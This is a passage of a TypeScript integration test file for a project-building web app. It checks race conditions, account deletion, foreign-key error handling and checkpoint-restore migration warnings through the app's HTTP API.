    { provider: gated.provider },
  );
});

/**
 * Same bug class as the test above, but for the OTHER four routes that
 * never checked activePipelines: adding/removing a whole screen ("entity")
 * or a single field on the spec review screen, before the project is ever
 * built. These are gated to project.status !== "built" (see their own
 * ENTITY_ADD_AFTER_BUILD/etc. comments), so the only in-flight pipeline they
 * can actually race with is one that leaves the project unbuilt while it
 * runs -- /build itself never calls the AI/heuristic provider at all (the
 * spec was already generated at project-creation time, so /build just reuses
 * project.spec as-is), so it has no async point this test's gated-provider
 * harness can pause it on; /answers, used here instead, does call
 * generateSpec(provider) on a still-unbuilt project, giving this test a real
 * window where activePipelines is set but project.status isn't "built" yet
 * -- the exact race window the four pre-build routes needed to be guarded
 * against.
 */
test("adding a new entity while an in-progress /answers call is still generating a new spec is rejected with 409, instead of racing its own spec write", async () => {
  const gated = createGatedProvider();
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      // Arm only now -- project creation itself must run at full speed.
      gated.arm();
      const answersPromise = fetch(`${baseUrl}/api/projects/${project.id}/answers`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ additionalRequest: "Also track invoices for customers." }),
      });
      answersPromise.catch(() => {});
      await gated.waitUntilStarted();

      const addEntityRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ label: "Shipment" }),
      });
      let addEntityBody: { code?: string } = {};
      try {
        addEntityBody = (await addEntityRes.json()) as { code?: string };
      } finally {
        gated.release();
      }
      assert.equal(addEntityRes.status, 409);
      assert.equal(addEntityBody.code, "PIPELINE_IN_PROGRESS");

      const answersRes = await answersPromise;
      assert.equal(answersRes.status, 200);

      // Once /answers has genuinely finished, the project is still unbuilt
      // (answers never calls markProjectBuilt), so adding an entity now
      // must succeed normally -- the guard rejects only the concurrent
      // call, it doesn't wedge the route shut afterward.
      const addEntityAgainRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ label: "Shipment" }),
      });
      assert.equal(addEntityAgainRes.status, 200);
    },
    { provider: gated.provider },
  );
});

/**
 * updateRecord (packages/db/src/repository.ts) reads the current row
 * (getRecord), merges the caller's partial `data` into it, then writes the
 * merged result back -- a read-then-write shape structurally identical to
 * the ones round 106 had to guard for project.spec. The difference here:
 * every step, in both the repository function and the PATCH route handler
 * wrapping it, is synchronous SQLite with no `await` in between, so two
 * concurrent PATCH requests can't actually interleave -- whichever's
 * handler runs second (in JS-turn order, not necessarily arrival order)
 * reads the first's already-committed write and correctly merges on top of
 * it. This was never directly exercised: existing CRUD tests only ever
 * PATCH sequentially. Proves the two concurrent partial updates below
 * (different fields on the same record) both survive, rather than one
 * silently clobbering the other back to a stale value.
 */
test("two concurrent PATCH requests to the same record, touching different fields, both survive -- neither clobbers the other back to a stale value", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    await collectSSE(buildRes);

    const recordRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ name: "Dana Levi", email: "dana@example.com", status: "New" }),
    });
    assert.equal(recordRes.status, 201);
    const { record } = (await recordRes.json()) as { record: { id: number } };

    const [patchNameRes, patchStatusRes] = await Promise.all([
      fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer/${record.id}`, {
        method: "PATCH",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "Dana Cohen" }),
      }),
      fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer/${record.id}`, {
        method: "PATCH",
        headers: authHeaders(token),
        body: JSON.stringify({ status: "Won" }),
      }),
    ]);
    assert.equal(patchNameRes.status, 200);
    assert.equal(patchStatusRes.status, 200);

    const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer`, {
      headers: authHeaders(token),
    });
    const { records } = (await listRes.json()) as { records: { id: number; name: string; status: string; email: string }[] };
    const final = records.find((r) => r.id === record.id)!;
    assert.equal(final.name, "Dana Cohen", "the name update must not have been lost");
    assert.equal(final.status, "Won", "the status update must not have been lost");
    assert.equal(final.email, "dana@example.com", "an untouched field must survive both partial updates unchanged");
  });
});

test("deleting your own account removes your owned projects (with their real data and checkpoints), your collaborations on other people's projects, and your own sessions -- while leaving another user's account, projects, and sessions completely untouched", async () => {
  await withServer(async (baseUrl) => {
    const leavingToken = await signup(baseUrl, "leaving-account1@example.com");
    const stayingToken = await signup(baseUrl, "staying-account1@example.com");

    // The leaving user owns a real, built project with real data.
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(leavingToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project: ownedProject } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${ownedProject.id}/build`, {
      method: "POST",
      headers: authHeaders(leavingToken),
    });
    await collectSSE(buildRes);

    // The leaving user is ALSO a collaborator on the staying user's own project.
    const stayingCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(stayingToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project: stayingProject } = (await stayingCreateRes.json()) as { project: { id: string } };
    await fetch(`${baseUrl}/api/projects/${stayingProject.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(stayingToken),
      body: JSON.stringify({ email: "leaving-account1@example.com" }),
    });

    // Sanity check before deleting.
    const beforeCollabAccess = await fetch(`${baseUrl}/api/projects/${stayingProject.id}`, { headers: authHeaders(leavingToken) });
    assert.equal(beforeCollabAccess.status, 200, "sanity check: the leaving user should have real collaborator access before deleting");

    const deleteRes = await fetch(`${baseUrl}/api/auth/account`, { method: "DELETE", headers: authHeaders(leavingToken) });
    assert.equal(deleteRes.status, 204);

    // The leaving user's own token is dead -- signed out immediately.
    const meAfter = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(leavingToken) });
    assert.equal(meAfter.status, 401, "the deleted user's own session token must stop working immediately");

    // A fresh login with the same credentials must fail -- the account is genuinely gone.
    const loginAfter = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: "leaving-account1@example.com", password: "correct-horse-battery" }),
    });
    assert.equal(loginAfter.status, 401);

    // The owned project is genuinely gone, not just hidden -- the staying
    // user (who was never on it) still can't see it, same as before.
    const outsiderCheck = await fetch(`${baseUrl}/api/projects/${ownedProject.id}`, { headers: authHeaders(stayingToken) });
    assert.equal(outsiderCheck.status, 404);

    // The staying user's own project and their own collaborator list are
    // completely untouched -- it still exists, and no longer lists the
    // now-deleted user as a collaborator, but nothing about the project itself broke.
    const stayingProjectAfter = await fetch(`${baseUrl}/api/projects/${stayingProject.id}`, { headers: authHeaders(stayingToken) });
    assert.equal(stayingProjectAfter.status, 200, "the staying user's own unrelated project must be completely untouched");
    const collabListAfter = await fetch(`${baseUrl}/api/projects/${stayingProject.id}/collaborators`, { headers: authHeaders(stayingToken) });
    const { collaborators } = (await collabListAfter.json()) as { collaborators: { email: string }[] };
    assert.ok(
      !collaborators.some((c) => c.email === "leaving-account1@example.com"),
      "the deleted user's collaborator grant must be gone from the project they no longer exist to access",
    );

    // The staying user's own session is still completely valid.
    const stayingMe = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(stayingToken) });
    assert.equal(stayingMe.status, 200, "a different user's own session must never be affected by someone else deleting their account");
  });
});

test("deleting your account requires a valid session, the same as any other authenticated route", async () => {
  await withServer(async (baseUrl) => {
    const res = await fetch(`${baseUrl}/api/auth/account`, { method: "DELETE" });
    assert.equal(res.status, 401);
  });
});

/**
 * New in this round (510): GET /projects (listProjectsForUser) silently
 * drops any project whose stored spec no longer parses against today's
 * ProductSpecSchema (a real, expected case for a project written by an
 * older app version -- tryRowToProject's own comment). DeleteAccountPanel.tsx
 * used to derive the project ids it hands to App.tsx for localStorage
 * cleanup (projectPreferenceCleanup.ts) straight from this same lenient
 * listing -- the exact gap DELETE /auth/account's own server-side cleanup
 * already avoids via listOwnedProjectIds (round 411). GET /projects/mine-ids
 * is the client-reachable equivalent: this confirms it still returns a
 * stale-spec owned project (written directly, bypassing insertProject,
 * standing in for an older app version's row) and a stale-spec shared
 * project both, exactly where GET /projects would silently exclude them.
 */
test("GET /projects/mine-ids still returns an owned or shared project whose stored spec no longer parses against today's schema, unlike GET /projects", async () => {
  await withServer(async (baseUrl, db) => {
    const ownerToken = await signup(baseUrl, "mine-ids-owner1@example.com");
    const collaboratorToken = await signup(baseUrl, "mine-ids-collaborator1@example.com");
    const collaboratorUser = findUserByEmail(db, "mine-ids-collaborator1@example.com")!;

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project: goodOwnedProject } = (await createRes.json()) as { project: { id: string } };
    await fetch(`${baseUrl}/api/projects/${goodOwnedProject.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "mine-ids-collaborator1@example.com" }),
    });

    // Written directly via raw SQL (bypassing insertProject, which would
    // itself require a valid spec) with no `roles` field, standing in for a
    // project written by an older app version -- one owned by this same
    // owner, one shared with this same collaborator.
    db.prepare(
      "INSERT INTO projects (id, ownerId, name, description, spec_json, status, createdAt) VALUES (?, ?, ?, ?, ?, ?, ?)",
    ).run("mine-ids-stale-owned", findUserByEmail(db, "mine-ids-owner1@example.com")!.id, "Stale owned", "test", JSON.stringify({ summary: "test", entities: [] }), "draft", new Date().toISOString());
    db.prepare(
      "INSERT INTO projects (id, ownerId, name, description, spec_json, status, createdAt) VALUES (?, ?, ?, ?, ?, ?, ?)",
    ).run("mine-ids-stale-shared", "some-other-owner", "Stale shared", "test", JSON.stringify({ summary: "test", entities: [] }), "draft", new Date().toISOString());
    db.prepare("INSERT INTO project_collaborators (projectId, userId, addedAt) VALUES (?, ?, ?)").run(
      "mine-ids-stale-shared",
      collaboratorUser.id,
      new Date().toISOString(),
    );

    const lenientRes = await fetch(`${baseUrl}/api/projects`, { headers: authHeaders(ownerToken) });
    const { projects: lenientProjects } = (await lenientRes.json()) as { projects: { id: string }[] };
    assert.ok(
      !lenientProjects.some((p) => p.id === "mine-ids-stale-owned"),
      "sanity check: GET /projects must actually exclude the stale-spec project, or this test isn't exercising the gap",
    );

    const ownerIdsRes = await fetch(`${baseUrl}/api/projects/mine-ids`, { headers: authHeaders(ownerToken) });
    assert.equal(ownerIdsRes.status, 200);
    const ownerIds = (await ownerIdsRes.json()) as { ownedProjectIds: string[]; sharedProjectIds: string[] };
    assert.deepEqual(
      ownerIds.ownedProjectIds.slice().sort(),
      [goodOwnedProject.id, "mine-ids-stale-owned"].sort(),
      "GET /projects/mine-ids must see the stale owned project too -- it never parses spec_json at all, so it can't miss a row this way",
    );

    const collaboratorIdsRes = await fetch(`${baseUrl}/api/projects/mine-ids`, { headers: authHeaders(collaboratorToken) });
    const collaboratorIds = (await collaboratorIdsRes.json()) as { ownedProjectIds: string[]; sharedProjectIds: string[] };
    assert.deepEqual(
      collaboratorIds.sharedProjectIds.slice().sort(),
      [goodOwnedProject.id, "mine-ids-stale-shared"].sort(),
      "GET /projects/mine-ids must see the stale shared project too, scoped correctly as 'shared' rather than 'owned'",
    );
  });
});

/**
 * New in this round (424): DELETE /auth/account used to only revoke this
 * account's sessions AFTER its whole per-project cleanup loop finished --
 * and that loop awaits a genuine network round-trip (whatsapp.disconnect's
 * own session.sock.logout()) for any project with a live WhatsApp
 * connection. While suspended on that await, this account's still-valid
 * token could authenticate an unrelated POST /projects and create a brand
 * new project -- one that was never in the owned-ids snapshot taken up
 * front, so it was never deleted, and (since projects.ownerId carries no
 * foreign-key constraint to users.id) the user row was still deleted out
 * from under it, permanently orphaning it under a user id that no longer
 * exists. Holds the fake socket's own logout() open with a real
 * never-resolving-until-released promise (the same deterministic
 * hold-the-async-call-open technique used elsewhere in this file, rather
 * than a timing-based sleep) to force this exact window open, then
 * confirms a request racing inside it is rejected -- sessions must already
 * be gone before the slow WhatsApp disconnect is reached.
 */
test("deleting your account revokes your sessions before the slow per-project WhatsApp disconnect runs, so a request racing inside that window can't create an orphaned project", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, "race-account-delete1@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      let logoutEntered = false;
      let releaseLogout!: () => void;
      const logoutHeld = new Promise<void>((resolve) => {
        releaseLogout = resolve;
      });
      createdSockets[0].sock.logout = async () => {
        logoutEntered = true;
        await logoutHeld;
      };

      const deletePromise = fetch(`${baseUrl}/api/auth/account`, { method: "DELETE", headers: authHeaders(token) });

      for (let i = 0; i < 40 && !logoutEntered; i++) {
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      assert.ok(logoutEntered, "expected the account-deletion request to actually be suspended inside the slow WhatsApp disconnect");

      const duringRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A second, unrelated project created during the deletion window." }),
      });
      assert.equal(
        duringRes.status,
        401,
        "the session must already be revoked before the slow WhatsApp disconnect begins -- a request racing inside that window must never succeed",
      );

      releaseLogout();
      const deleteRes = await deletePromise;
      assert.equal(deleteRes.status, 204);
    },
    {
      whatsapp: (db) => {
        const { manager, createdSockets: sockets } = createTestWhatsAppManager(db);
        createdSockets = sockets;
        return manager;
      },
    },
  );
});

/**
 * Regression test for a real gap found by round 292's Explore survey:
 * deleting a record another record still points to via a `relation` field
 * fails a real foreign-key constraint (`PRAGMA foreign_keys = ON`,
 * connection.ts) -- but that threw a bare "FOREIGN KEY constraint failed"
 * Error node:sqlite raises, which app.ts's generic error handler turned
 * into an unexplained 500. Worse, EntityPanel.tsx's own deferred-delete
 * undo window (round 108-ish) discarded ANY failure silently (a bare
 * `.catch(() => {})`, fixed the same round as this), so the row would
 * disappear from view and only reappear, unexplained, on the next
 * refetch -- the server-side half of that bug, confirmed here directly
 * against the API rather than through the UI. Now translated into an
 * actionable 409, the same route-level pattern as EXPORT_UNSAFE_IDENTIFIER
 * (round 284): confirms the delete is rejected with
 * RECORD_HAS_DEPENDENT_RECORDS, and -- the actual regression -- that the
 * referenced record genuinely still exists afterward, not silently gone.
 */
test("deleting a record another record still references through a relation field is rejected with RECORD_HAS_DEPENDENT_RECORDS, and the record survives", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "record-delete-dependent@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A small courier delivery business." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    assert.deepEqual(
      project.spec.entities.map((e) => e.name).sort(),
      ["Courier", "Order"],
      "this description should match exactly Order (with a courierId relation) and Courier",
    );

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const courierRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Courier`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ name: "Dave", status: "Available" }),
    });
    assert.equal(courierRes.status, 201);
    const { record: courier } = (await courierRes.json()) as { record: { id: number } };

    const orderRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Order`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ customerName: "Jane", total: 50, status: "Pending", courierId: courier.id }),
    });
    assert.equal(orderRes.status, 201, "the Order must actually be created referencing this courier for the test to mean anything");

    const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Courier/${courier.id}`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(deleteRes.status, 409, "deleting a courier a real order still references must be rejected, not 500 or silently succeed");
    assert.equal(((await deleteRes.json()) as { code?: string }).code, "RECORD_HAS_DEPENDENT_RECORDS");

    const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Courier`, { headers: authHeaders(token) });
    const { records: couriers } = (await listRes.json()) as { records: { id: number }[] };
    assert.ok(couriers.some((c) => c.id === courier.id), "the referenced courier must genuinely still exist -- the rejected delete must not have partially applied");
  });
});

/**
 * Regression test for a real gap round 394's Explore survey found: the
 * DELETE route above translates a FOREIGN KEY constraint failure into a
 * clear 409, but creating or updating a record with a relation value that
 * doesn't exist (e.g. referencing a Courier that was already deleted by
 * another collaborator between EntityPanel.tsx fetching its relation
 * picker options and the user submitting the form) hit the exact same
 * constraint on the write side and was never translated -- app.ts's
 * generic error handler turned it into an unexplained 500 instead. Fixed
 * the same way as the DELETE route: translated into a 400
 * INVALID_RELATION_TARGET, for both POST (create) and PATCH (update).
 */
test("creating or updating a record with a relation value that doesn't exist is rejected with INVALID_RELATION_TARGET, not a 500", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "invalid-relation-target@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A small courier delivery business." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const missingCourierId = 999999;

    const createOrderRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Order`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ customerName: "Jane", total: 50, status: "Pending", courierId: missingCourierId }),
    });
    assert.equal(createOrderRes.status, 400, "creating a record referencing a nonexistent courier must be rejected with a real 400, not a 500");
    assert.equal(((await createOrderRes.json()) as { code?: string }).code, "INVALID_RELATION_TARGET");

    const courierRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Courier`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ name: "Dave", status: "Available" }),
    });
    const { record: courier } = (await courierRes.json()) as { record: { id: number } };
    const validOrderRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Order`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ customerName: "Jane", total: 50, status: "Pending", courierId: courier.id }),
    });
    assert.equal(validOrderRes.status, 201, "a valid courierId must still create the order normally");
    const { record: order } = (await validOrderRes.json()) as { record: { id: number } };

    const updateOrderRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Order/${order.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ courierId: missingCourierId }),
    });
    assert.equal(updateOrderRes.status, 400, "updating a record to reference a nonexistent courier must be rejected with a real 400, not a 500");
    assert.equal(((await updateOrderRes.json()) as { code?: string }).code, "INVALID_RELATION_TARGET");

    const getOrderRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Order`, { headers: authHeaders(token) });
    const { records: orders } = (await getOrderRes.json()) as { records: { id: number; courierId: number }[] };
    const survivingOrder = orders.find((o) => o.id === order.id);
    assert.equal(survivingOrder?.courierId, courier.id, "the rejected update must not have partially applied -- the order must still reference its original, valid courier");
  });
});

/**
 * Regression test for a real gap round 312's Explore survey found in
 * `diffAndMigrate`'s "new_column" branch (migrate.ts): a relation field
 * added to an *entity that already existed* -- the ordinary shape of a
 * real refine, e.g. "also link Orders to a Customer" on a project that
 * already had both entities -- got no REFERENCES clause at all, unlike a
 * relation field present from the entity's very first build
 * (generateCreateTableStatements already handled that case correctly, as
 * the test above confirms). The DELETE route's own FOREIGN KEY constraint
 * translation (RECORD_HAS_DEPENDENT_RECORDS, same as above) was never
 * actually reachable for a column added this way, because the database
 * itself never raised the constraint in the first place -- the delete
 * just silently succeeded. Exercises the exact real-world scenario end to
 * end through the real HTTP API: initial build with Customer+Order
 * unrelated, a real /refine call that adds the relation, then the same
 * delete-a-still-referenced-record check as the test above.
 */
test("a relation field added via refine to an already-existing entity gets the same FK protection as one present from the first build", async () => {
  const buildSpec: ProductSpec = {
    summary: "test",
    personas: [],
    roles: ["Admin"],
    entities: [
      { name: "Customer", fields: [{ name: "name", type: "text", required: true }] },
      { name: "Order", fields: [{ name: "total", type: "number", required: true }] },
    ],
    screens: [],
    assumptions: [],
    openQuestions: [],
  };
  const refinedSpec: ProductSpec = {
    ...buildSpec,
    entities: [
      buildSpec.entities[0],
      {
        ...buildSpec.entities[1],
        fields: [...buildSpec.entities[1].fields, { name: "customerId", type: "relation", required: false, relationTo: "Customer" }],
      },
    ],
  };
  let callCount = 0;
  const provider: SpecProvider = {
    name: "test-fixture",
    async generate() {
      callCount += 1;
      return callCount === 1 ? buildSpec : refinedSpec;
    },
  };

  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, "refine-relation-fk@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A small ordering app." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
      await collectSSE(buildRes);

      const refineRes = await fetch(`${baseUrl}/api/projects/${project.id}/refine`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ instruction: "Also link each order to a customer." }),
      });
      const refineEvents = await collectSSE(refineRes);
      assert.ok(refineEvents.every((e) => e.status !== "failed"), "refine should succeed");

      const customerRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "Jane" }),
      });
      assert.equal(customerRes.status, 201);
      const { record: customer } = (await customerRes.json()) as { record: { id: number } };

      const orderRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Order`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ total: 50, customerId: customer.id }),
      });
      assert.equal(orderRes.status, 201, "the Order must actually be created referencing this customer for the test to mean anything");

      const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer/${customer.id}`, {
        method: "DELETE",
        headers: authHeaders(token),
      });
      assert.equal(
        deleteRes.status,
        409,
        "deleting a customer an order still references via a refine-added relation field must be rejected, not silently succeed",
      );
      assert.equal(((await deleteRes.json()) as { code?: string }).code, "RECORD_HAS_DEPENDENT_RECORDS");

      const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer`, { headers: authHeaders(token) });
      const { records: customers } = (await listRes.json()) as { records: { id: number }[] };
      assert.ok(customers.some((c) => c.id === customer.id), "the referenced customer must genuinely still exist");
    },
    { provider },
  );
});

/**
 * New in this round: the checkpoint-restore route calls diffAndMigrate the
 * exact same way /build and /refine do (pipeline.ts), but used to throw its
 * return value away completely -- so a restore that reuses a column whose
 * physical SQL type no longer matches what the restored spec claims (e.g. a
 * field that was boolean at checkpoint time but has since been retyped to
 * text under the same name) got no warning at all, unlike the identical
 * situation during a real /build or /refine. Engineered directly via the DB
 * layer (not a real /build+/refine round trip) so the exact "same field
 * name, different declared type" scenario is deterministic rather than
 * dependent on what the heuristic spec generator happens to produce from a
 * free-text description.
 */
test("restoring a checkpoint surfaces a migrationWarning when a reused column's physical type no longer matches the restored spec, the same diagnostic /build and /refine already give", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `restore-warning-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const specWithBooleanWon: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Deal",
          fields: [
            { name: "title", type: "text", required: true },
            { name: "won", type: "boolean", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const specWithTextWon: ProductSpec = {
      ...specWithBooleanWon,
      entities: [
        {
          name: "Deal",
          fields: [
            { name: "title", type: "text", required: true },
            { name: "won", type: "text", required: false },
          ],
        },
      ],
    };

    const projectId = randomUUID();
    insertProject(db, {
      id: projectId,
      ownerId: user.id,
      name: "Deal tracker",
      description: "A CRM for tracking deals.",
      spec: specWithTextWon,
    });
    // Builds the physical table with "won" as a TEXT column.
    diffAndMigrate(db, projectId, undefined, specWithTextWon);
    const checkpoint = insertCheckpoint(db, {
      id: randomUUID(),
      projectId,
      label: "Initial build",
      kind: "build",
      spec: specWithTextWon,
    });

    // Simulates a later refine that retypes "won" to boolean under the same
    // name -- diffAndMigrate leaves the physical column as TEXT (same
    // documented limitation type_changed exists to report), and the spec
    // pointer moves on, exactly like /refine's own route does.
    diffAndMigrate(db, projectId, specWithTextWon, specWithBooleanWon);
    updateProjectSpec(db, projectId, specWithBooleanWon);

    // Restoring the original checkpoint moves the spec pointer back to
    // "won: text", but the physical column has been TEXT the entire time --
    // round 1198's own fix deliberately still reports this one: it only
    // suppresses an oscillation back to a type whose SQL shape is
    // UNAMBIGUOUS (boolean/relation's shared INTEGER bucket, number's own
    // REAL), never the TEXT bucket (text/longtext/enum/date) a field's
    // existing string values can still be semantically wrong for, however
    // many times the declared type has round-tripped -- so this restore
    // must still surface a genuine hazard, and the fix under test is that
    // the restore route must no longer discard it.
    const restoreRes = await fetch(`${baseUrl}/api/projects/${projectId}/checkpoints/${checkpoint.id}/restore`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(restoreRes.status, 200);
    const restoreBody = (await restoreRes.json()) as {
      project: { spec: { entities: { fields: { name: string; type: string }[] }[] } };
      migrationWarning: string | null;
    };
    assert.equal(
      restoreBody.project.spec.entities[0].fields.find((f) => f.name === "won")!.type,
      "text",
      "the restore itself must still move the spec pointer back",
    );
    assert.ok(restoreBody.migrationWarning, "a migrationWarning must be present given the reused column's type mismatch");
    assert.match(restoreBody.migrationWarning!, /won \(boolean → text\)/);
    assert.match(restoreBody.migrationWarning!, /kept the original database column type/);

    // Control: restoring a checkpoint whose spec already matches the
    // current project.spec (the restore above just moved the pointer back
    // to specWithTextWon) reports no mismatch, so migrationWarning must
    // come back null, not an empty-but-present string.
    const cleanRestoreRes = await fetch(`${baseUrl}/api/projects/${projectId}/checkpoints/${checkpoint.id}/restore`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(cleanRestoreRes.status, 200);
    const cleanRestoreBody = (await cleanRestoreRes.json()) as { migrationWarning: string | null };
    assert.equal(cleanRestoreBody.migrationWarning, null);
  });
});

/**
 * Round 977: diffAndMigrate's own type_changed detection never touches a
 * retyped field's existing column DATA (by design -- same test file's own
 * migrationWarning tests just above confirm that), but it also never
 * cleaned up a now-orphaned disk upload when the field moves AWAY from
 * "file" -- deleteReplacedFileFields (the only other cleanup mechanism for
 * a file-field upload) only ever matches the field's CURRENT type, so once
 * it stops being "file" no future PATCH/DELETE on that entity's records
 * would ever reach it either. Reproduces the exact real scenario: a field
 * built as "file", a real record uploads a real file to it, then a
 * checkpoint restore moves the field back to a non-"file" type from an
 * earlier checkpoint -- the restore route is the simplest real path to
 * this (no AI call to mock, unlike /refine), and shares the identical
 * diffAndMigrate call pipeline.ts's own /refine path goes through.
 */
test("restoring a checkpoint that retypes a field away from 'file' deletes the now-orphaned upload from disk", async () => {
  await withServer(async (baseUrl, db, uploadsDir) => {
    const email = `restore-file-cleanup-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const specWithTextAttachment: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Document",
          fields: [
            { name: "title", type: "text", required: true },
            { name: "attachment", type: "text", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const specWithFileAttachment: ProductSpec = {
      ...specWithTextAttachment,
      entities: [
        {
          name: "Document",
          fields: [
            { name: "title", type: "text", required: true },
            { name: "attachment", type: "file", required: false },
          ],
        },
      ],
    };

    const projectId = randomUUID();
    insertProject(db, {
      id: projectId,
      ownerId: user.id,
      name: "Docs",
      description: "A document tracker.",
      spec: specWithTextAttachment,
    });
    diffAndMigrate(db, projectId, undefined, specWithTextAttachment);
    const checkpoint = insertCheckpoint(db, {
      id: randomUUID(),
      projectId,
      label: "Initial build",
      kind: "build",
      spec: specWithTextAttachment,
    });

    // Simulates a later refine that retypes "attachment" to a real file
    // field, under the same name -- the physical column stays TEXT either
    // way (sqlTypeFor maps both to the same SQL type), so this needs no
    // ALTER to "work" well enough for a real upload to actually land there.
    diffAndMigrate(db, projectId, specWithTextAttachment, specWithFileAttachment);
    updateProjectSpec(db, projectId, specWithFileAttachment);

    // A real uploaded file, on disk, exactly where the real upload route
    // would have put it -- not a stand-in path.
    const filename = `${randomUUID()}.pdf`;
    const fileDir = path.join(uploadsDir, projectId, "Document");
